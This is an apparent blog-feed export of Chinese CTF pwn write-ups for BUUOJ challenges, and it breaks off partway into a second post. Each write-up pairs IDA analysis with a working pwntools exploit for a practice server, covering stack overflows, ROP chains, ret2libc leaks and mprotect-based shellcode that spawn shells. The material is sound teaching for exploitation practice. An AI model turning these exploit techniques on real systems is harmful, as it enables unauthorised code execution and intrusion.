      <url>/2022/07/buuoj-pwn-wp2/</url>
      
        <content type="html"><![CDATA[<p>持续更新</p><h2 id="ciscn-2019-n-8">ciscn_2019_n_8</h2><p>checksec,Canary,PIE,NX均开启<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-28%20125400.jpg" alt="checksec1"></p><p>IDA分析<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-28%20125812.jpg" alt="IDA1"><br>所以只需要使var_13的值为17即可拿shell，isoc99_scanf未限定输入长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28421</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">r.recvline()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">13</span> * <span class="number">4</span> + p32(<span class="number">17</span>) <span class="comment"># int有4字节</span></span><br><span class="line"><span class="comment"># payload = p32(17) * 14</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;87eae600-681d-4257-9cbc-5c49f597082f&#125;</code></p><h2 id="jarvisoj-level2">jarvisoj_level2</h2><p>checksec，再IDA分析<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-28%20132109.jpg" alt="IDA2"><br>buf分配的空间大小明显小于read函数允许读入的字符长度，存在栈溢出。<br>且该程序有system函数和’/bin/sh’，可以构造拿shell。很简单的栈溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25097</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./level2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh_addr)</span><br><span class="line"><span class="comment"># r.recvline()</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;877fe44d-2b7a-4891-abf9-1e998db084ec&#125;</code></p><h2 id="bjdctf-2020-babystack">bjdctf_2020_babystack</h2><p>checksec，再IDA分析<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-28%20132857.jpg" alt="IDA3"><br>存在backdoor函数，可以直接调用<code>system('/bin/sh')</code>拿shell。<br>main函数中read函数读入的字符串长度是我们自己控制的，给buf分配的空间却是固定的，我们可以输入一个较大的数字，从而使程序发生栈溢出。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-28%20133313.jpg" alt="gdb1"><br>需要(0x10+0x8)个字节的垃圾数据，还需要backdoor函数的地址，编写脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27010</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_babystack&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400833</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>] <span class="comment"># </span></span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment"># </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">24</span> + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) <span class="comment"># </span></span><br><span class="line"><span class="comment"># 开始时没没看到bakcdoor函数，使用的是ROP，使用以下语句进行替换也是可以的</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">length_payload = <span class="built_in">len</span>(payload)</span><br><span class="line"><span class="comment"># length_payload = flat([str(length_payload)]) 建议添加这条语句</span></span><br><span class="line"><span class="comment"># r.sendline(length_payload)</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;b2fb4957-e796-4af5-8112-86c2b7eba6c0&#125;</code></p><h2 id="OGeek2019-babyrop">[OGeek2019]babyrop</h2><p>checksec<br>IDA分析<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-28%20165405.jpg" alt="1"><br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-28%20165344.jpg" alt="2"><br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-28%20165423.jpg" alt="3"><br>main中buf为随机产生的字符串，sub_804871F中要求我们输入字符串与随机产生的字符串一定长度字符相同，否则程序直接退出。<br>我们只需要使strncmp函数返回结果为0即可。<br>strlen是遇到’\x00’后停止计算，所以我们可以令第一个字符为’\x00’，若传入strncmp()的长度参数为0，则strncmp函数返回值为0。<br>sub_804871F返回值为buf[7]，即buf的第8个元素，有作为参数传入sub_80487D0中。若buf[7]的值不为127，则读入的字符串长度为buf[7]的值。<br>buf[7]为int8(8位int)，sub_804871F中buf长度为231字节，小于2^8-1，可能存在栈溢出。<br>此题没有system函数和’/bin/sh’，我们需要再got表中读取某个函数，这里我们选用write读取write自身的地址。读取后接收返回数据，并返回main函数。<br>发送的第一个payload可构造为b’\x00’ + (6个垃圾数据) + b’\xff’<br>发送的第二个payload为b’a’ * (0xe7 + 0x4) + write函数的plt地址 + main函数 + write第一个参数1 + write在got表中的地址 + write的第二个参数4<br>回到main函数后发送重复第一个payload，再发送第三个payload<br>第三个payload为b’a’ * (0xe7 + 0x4) + system函数地址 + 4字节垃圾数据 + '/bin/sh’地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26711</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23(2).so&#x27;</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment"># main_addr = elf.symbols[&#x27;main&#x27;]</span></span><br><span class="line"><span class="comment"># print(hex(write_plt),hex(write_got),hex(main_addr))</span></span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">6</span> + <span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">payload2 = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">0x4</span>),write_plt,main_addr,<span class="number">1</span>,write_got,<span class="number">4</span>])</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"><span class="comment"># print(r.recv(4))</span></span><br><span class="line">libc_write = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_write))</span><br><span class="line">libc_base = libc_write - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload3 = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">0x4</span>),libc_system,<span class="number">0xdead</span>,bin_sh_addr])</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>))</span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>还是卡了好久，发现是libc版本问题，一开始使用的是64位的libc，后来换用32位libc成功打通。<br>flag为<code>flag&#123;f1dc0359-776a-4051-8b3a-072bf3782083&#125;</code></p><h2 id="get-started-3dsctf-2016">get_started_3dsctf_2016</h2><p>先checksec<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-30%20221500.jpg" alt="checksec"><br>有一个小姿势是linux下<code>file</code>命令可以查看文件信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file 文件名</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-30%20221704.jpg" alt=""><br>这个文件是静态链接的<br>不过在此题中没太大用（只是看到IDA里面一堆函数，心血来潮看一下）<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-30%20222232.jpg" alt="IDA main"><br>main函数中gets函数存在栈溢出。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-30%20222432.jpg" alt="IDA get_flag"><br>get_flag里可以读取flag.txt文件内容，只要满足a1,a2变量的条件即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25642</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">get_flag_addr = elf.symbols[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line"><span class="comment"># print(hex(get_flag_addr))</span></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line">dead = elf.symbols[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>) + p32(get_flag_addr) + p32(dead) + p32(a1) +p32(a2)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br></pre></td></tr></table></figure><p>值得注意的是，我们在构造payload时很多时候都不会考虑到程序退出的问题。<br>因为我们调用system函数时，系统会先调用fork()创建子进程，由子进程来调用/bin/sh-c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。我们通常的拿shell方式是调用系统调用函数（包括system(),execve()等函数），此时是我们与操作系统创建的子进程进行交互，通常可以正常得到回显的结果，拿到结果，返回程序进程后，如果我们payload给出的是一个无效返回地址，程序会崩溃退出，但此时已经与我们没有什么关系了。<br>但本题不一样，如果本题无法正常退出，我们就拿不到返回结果。所以我们可以调用exit函数，让程序正常退出。<br>flag为<code>flag&#123;8ce19758-b912-4823-a0ff-6e86353b8d9b&#125;</code></p><p>在网上看到另一种方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure><p>第一个参数填的是一个地址，是指需要进行操作的地址。<br>第二个参数是地址往后多大的长度。<br>第三个参数的是要赋予的权限。<br>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。(作用比较类似于在逆向hook部分提到的virtualprotect())<br>我们可以将一段内存设定为可读可写可执行，然后用ret2shellcode的手法，将shellcode写入该段内存，从而执行shellcode拿shell。(prot = 7)<br>指定的内存区间必须包含整个内存页（linux中一般为4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。<br>至于如何将shellcode写入内存指定位置，使用read()即可将指定长度的字符写入以给定地址开始的一段内存中。这也是常见手法。<br>pwntools自带的<code>shellcrft.sh()</code>可以生成<code>system('/bin/sh')</code>的机器码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># exp是网上找到现成的</span></span><br><span class="line">q = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25642</span>)</span><br><span class="line"><span class="comment">#q = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">buf = <span class="number">0x80ea000</span></span><br><span class="line">pop_3_ret = <span class="number">0x0804f460</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload += p32(mprotect)</span><br><span class="line">payload += p32(pop_3_ret)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">0x7</span>)</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">q.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">q.sendline(shellcode)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">q.interactive()</span><br></pre></td></tr></table></figure><p>还有一种方法是我自己尝试使用的，既然这里禁掉了system()，那么我还可以直接调用系统调用函数execve拿shell，我只需要构造gadget给eax,ebx,ecx,edx赋值即可，再调用中断指令调用系统函数。本题是静态链接，寻找合适的gadget很容易。缺少’/bin/sh’可以用’sh’替代。可惜没有成功。</p><h2 id="jarvisoj-level2-x64">jarvisoj_level2_x64</h2><p>与jarvisoj_level2类似，只是文件是x64。<br>x86和x64一个主要区别是传参方式不同。<br>先checksec<br>大体思路与jarvisoj_level2类似，只是给system函数传参时，要将参数传给rdi，所以需要寻找<code>pop rdi|ret</code>的gadget。<br>直接放脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25081</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./level2_x64&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;level2_x64&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;8ae1b539-6038-46c4-a4bf-e12a20e3fbb8&#125;</code></p><h2 id="HarekazeCTF2019-baby-rop">[HarekazeCTF2019]baby_rop</h2><p>先checksec<br>main函数<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-30%20232629.jpg" alt="IDA"><br>isoc99_scanf()未限制输入长度，会造成栈溢出。（可以简简单单测试一波，输入一段很长的数据会出现段错误）。<br>system和’/bin/sh’都有，可以快快乐乐的拿shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28139</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop&#x27;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400683</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi_ret, bin_sh_addr, system_addr])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>拿到shell后需要在靶机文件系统中，寻找flag。一般用户文件放在home目录下，进home/babyrop目录可以找到flag。（一开始我以为babyrop是我们拿到的程序，被骗了）。<br>直接<code>find -name flag</code>比较方便。<br>flag为<code>flag&#123;e9a771df-0b2a-4320-af06-3c5635d6aa20&#125;</code></p><h2 id="ciscn-2019-en-2">ciscn_2019_en_2</h2><p>IDA分析后发现和之前的ciscn_2019_c_1好像是一样。<br>最离谱的是我仅修改了之前的exp的端口号，竟然就打通了……</p><h2 id="not-the-same-3dsctf-2016">not_the_same_3dsctf_2016</h2><p>先checksec<br>IDA中有函数和get_secret函数<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-31%20203607.jpg" alt=""><br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-31%20203642.jpg" alt=""><br>main函数中gets函数存在栈溢出，get_secret函数中读取了flag.txt文件中的内容，并存入fl4g中，fl4g位于bss段。<br>所以我们可以劫持程序流执行到get_secret函数。又由于get_secret无法直接打印flag，所以我们要调用printf等具有打印功能的函数，这里选用printf。<br>和前面get_started_3dsctf_2016一样，我们的程序需要正常退出才有回显，所以需要找到exit函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29107</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">get_flag = elf.symbols[<span class="string">&#x27;get_secret&#x27;</span>]</span><br><span class="line">exit_addr = elf.symbols[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">flag = elf.symbols[<span class="string">&#x27;fl4g&#x27;</span>]</span><br><span class="line">printf_addr = elf.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">45</span>, get_flag, printf_addr, exit_addr, flag, <span class="number">0</span>])</span><br><span class="line"><span class="comment"># r.recvuntil(&#x27;m3m0... &#x27;)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br></pre></td></tr></table></figure><p>本题另一个方法与思路get_started_3dsctf_2016一样。<br>flag为<code>flag&#123;94dd8687-184a-40cd-8f6f-b4cbf0dc553f&#125;</code></p><h2 id="ciscn-2019-n-5">ciscn_2019_n_5</h2><p>checksec，存在可写可执行段。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-31%20204203.jpg" alt=""><br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-31%20204339.jpg" alt=""><br>main函数中首先读入字符串存入name中，name位于bss段，然后gets函数读入v4，存在栈溢出。<br>第一个思路是向bss段写入shellcode，然后劫持程序执行流执行shellcode。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/buuoj-pwn-wp2/2022-07-31%20204731.jpg" alt=""><br>首先向name发送shellcode，在gets函数中需要写入的填充数据长度为0x28字节，和name的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25356</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_n_5&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"><span class="comment"># r.recvline()</span></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"><span class="comment"># r.recvuntil(&#x27;?\n&#x27;)</span></span><br><span class="line">shellcode_addr = elf.symbols[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>, shellcode_addr])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>还有另一种方法类似于ret2libc，先泄露函数地址，输出，再返回main函数，调用system函数拿shell，不过没有拿到回显地址，没有打成。</p><p>flag为<code>flag&#123;aad9d677-0040-44b9-8eec-978bde7f8360&#125;</code>。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ pwn wp 1</title>
      <link href="/2022/07/buuoj-pwn-wp1/"/>
      <url>/2022/07/buuoj-pwn-wp1/</url>
      
        <content type="html"><![CDATA[<p>持续更新<br>相关知识会更新在其他文章中。</p><h2 id="test-your-nc">test_your_nc</h2><p>先checksec，是64位程序，拖入IDA。</p><p>main函数是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如同名字一样，直接使用nc进行连接，或者编写脚本进行连接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28795</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./test&#x27;)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>就可以直接拿shell，<code>ls</code> + <code>cat flag</code>搞定<br>flag为<code>flag&#123;dd3017eb-3297-48de-a5e4-799b37b9e81a&#125;</code></p><h2 id="rip">rip</h2><p>思路类似于ret2text<br>先checksec，是64位程序，且基本没有保护。IDA分析</p><p>其中main函数为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span 